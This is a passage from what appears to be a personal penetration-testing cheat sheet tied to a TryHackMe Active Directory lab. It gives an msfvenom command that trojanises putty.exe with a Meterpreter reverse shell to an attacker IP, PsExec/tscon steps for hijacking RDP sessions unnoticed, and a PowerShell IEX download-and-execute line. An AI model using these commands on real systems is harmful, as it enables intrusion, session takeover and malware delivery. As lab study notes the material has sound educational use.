</span><span class="n">msfvenom</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">x64</span><span class="w"> </span><span class="nt">--platform</span><span class="w"> </span><span class="nx">windows</span><span class="w"> </span><span class="nt">-x</span><span class="w"> </span><span class="nx">putty.exe</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">windows/meterpreter/reverse_tcp</span><span class="w"> </span><span class="nx">lhost</span><span class="o">=</span><span class="err">&lt;</span><span class="n">attacker_ip</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lport</span><span class="o">=</span><span class="mi">4444</span><span class="w"> </span><span class="nt">-b</span><span class="w"> </span><span class="s2">"\x00"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="n">exe</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">puttyX.exe</span><span class="w">
</span></code></pre></div>

<h3>RDP hijacking</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># when an administrator closed the RDP client instead of logging off, take over their session if you have SYSTEM privileges.</span><span class="w">

</span><span class="c"># run cmd.exe as admin and run psexec64.exe</span><span class="w">
</span><span class="n">PsExec64.exe</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">

</span><span class="c"># list the existing sessions</span><span class="w">
</span><span class="n">query</span><span class="w"> </span><span class="nx">user</span><span class="w">

</span><span class="c"># if any session from the output has the state "disc", it can be taken over</span><span class="w">
</span><span class="c"># state "active" works too, but you'll kick the real user out and get noticed</span><span class="w">
</span><span class="n">tscon</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">session_id</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/dest:</span><span class="err">&lt;</span><span class="nx">our_session_name</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h2>useful commands</h2>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># set ANSI color bit for windows (useful for winpeas)</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">ADD</span><span class="w"> </span><span class="nx">HKCU\Console</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">VirtualTerminalLevel</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_DWORD</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">1</span><span class="w">

</span><span class="c"># download with powershell</span><span class="w">
</span><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadString</span><span class="p">(</span><span class="s1">'&lt;address&gt;'</span><span class="p">)</span><span class="w"> </span><span class="c"># download and execute</span><span class="w">
</span><span class="nx">wget</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">address:port</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">file</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Outfile</span><span class="w"> </span><span class="nx">file.exe</span><span class="w"> </span><span class="c"># just download</span><span class="w">

</span><span class="c"># add modules</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="o">.</span><span class="nf">ps1</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="p">(</span><span class="bp">$PSScriptRoot</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">".\&lt;filename&gt;.ps1"</span><span class="p">)</span><span class="w"> </span><span class="c"># alternative syntax</span><span class="w">
</span></code></pre></div>

<h2>references</h2>

<ul>
<li><a href="https://tryhackme.com/room/exploitingad" rel="nofollow">https://tryhackme.com/room/exploitingad</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

